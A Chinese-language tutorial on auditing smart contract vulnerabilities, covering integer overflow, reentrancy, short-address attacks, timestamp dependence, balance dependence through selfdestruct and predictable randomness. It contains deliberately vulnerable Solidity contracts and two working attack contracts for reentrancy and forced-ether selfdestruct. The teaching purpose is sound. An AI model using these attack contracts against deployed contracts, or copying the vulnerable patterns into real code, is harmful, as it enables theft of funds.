## 智能合约常见漏洞审计
 **整数溢出**
 在solidity0.8.0开始，加入了自动检查溢出功能，此版本之后的合约,不必担心这个漏洞。
```Solidity
  function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) {
    uint cnt = _receivers.length;
    uint256 amount = uint256(cnt) * _value;
    require(cnt > 0 && cnt <= 20);
    require(_value > 0 && balances[msg.sender] >= amount);

    balances[msg.sender] = balances[msg.sender].sub(amount);
    for (uint i = 0; i < cnt; i++) {
        balances[_receivers[i]] = balances[_receivers[i]].add(_value);
        Transfer(msg.sender, _receivers[i], _value);
    }
    return true;
  }
```
batchTransfer 函数，它用于给地址列表中的所有地址都转账 _value,
但是没有检查 amount 是否溢出，这导致每个人的转账金额 _value 很大，
但是总共的 amount 却接近0.
所以要引入:library SafeMath {} 来规避掉溢出问题.

**重入攻击(递归调用攻击)**
transfer与send的区别
如果转账过程中出现问题，transfer会直接回退，所有之前的操作全部作废。
而send则不会回退交易，而是返回一个结果值true或false，至于回不回退，由调用者自己决定。
所以transfer就等于require(send),call函数则与send基本相同，只是gas费你可以自由指定。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```
当攻击者调用储币合约中的 withdraw 函数时，withdraw 使用 call 底层调用发送以太币，
此时接收者是攻击者的 fallback 函数，因此如果在 fallback 函数中重新调用 withdraw 函数，
并且没有检查机制，就会发生重入攻击。

**payable函数导致合约余额更新**
当函数执行时，合约会先读取到交易对象，因此合约的余额会变成原来的余额+msg.value,
某些合约可能会未注意到余额的变化而产生漏洞。
**短地址攻击**
因为交易中data参数是原始的调用数据经过ABI编码的数据，ABI规则中常常会为了凑够32字节，在对原始参数编码时进行符号扩充。因此，如果输入的地址太短，那么编码时不会检查，就会直接补零，导致接收者改变。
**挖矿属性依赖**
合约中有部分内置变量，这些变量会受到矿工的影响，因此不应该把它们当作特定的判断条件。
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
contract Roulette {
    uint public pastBlockTime;
    fallback() external payable {
        require(msg.value == 10 ether);
        require(block.timestamp != pastBlockTime);
        pastBlockTime = block.timestamp;
        if(block.timestamp % 15 == 0){//依赖了区块时间戳
        payable(msg.sender).transfer(address(this).balance);
        }   
    }
}
```
**合约余额依赖**
selfdestruct函数是内置的强制执行的函数，因此即使合约没有可接受以太币的方法，
其他人依然可以通过强制执行selfdestruct函数改变合约余额，所以要仔细检查是否将合约余额作为判断标准。
例如，下面的合约，规定只有恰好7 ether的才能胜出，但是攻击者可以通过selfdestruct函数让没有人能够达到 7 ether.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");//只有合约余额达到 7 ether 才能成功

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}

```
**悬赏白帽子处理黑客潜规则**
**随机数攻击**
针对智能合约生成算法进行攻击，预测生成结果。目前区块链上很多合约都是采用的链上信息，
如区块时间戳，未来区块哈希等。作为游戏合约的随机数源，也称种子。使用这种种子生成的随机数
被称为伪随机数。它不是真的随机数，存在被预测的可能。当使用可被预测的种子生成随机数的时候，
一旦生成算法被攻击者猜到或通过逆向方式拿到攻击者就可以实现预测。
由于区块链上的数据对所有人都公开透明，完全可以提前拿到数据，并计算结果。做法就是，创建一个攻击合约
attack，这个合约中先预测结果，再决定是否调用其它函数。由于两个合约再同一个区块中被运行，也就是说它们拿到的
区块难度值和时间戳相同，所以攻击者有能力先预测结果在调用。         

**自毁函数攻击**
自毁函数是一个很隐蔽的可以发送以太的方法。攻击者可以利用该函数，向目标合约强制转账，从而影响目标合约的正常功能。
由于这个合约没有fallback和receive函数，所以不会接受外部发来的以太。若黑客绕开deposit函数充入以太，则游戏便无法
进行了，不会再产生赢家。而如何绕开deposit函数呢？就是利用selfdestruct函数向攻击目标合约强制转账，黑客先在攻击合约中
存满7个以太，然后执行自会函数。那么七个以太就会强制转账给目标合约了。以太坊留有后门，可以通过自会函数强制转账，即使被
攻击的合约没有fallback或receive函数。

**访问控制漏洞**





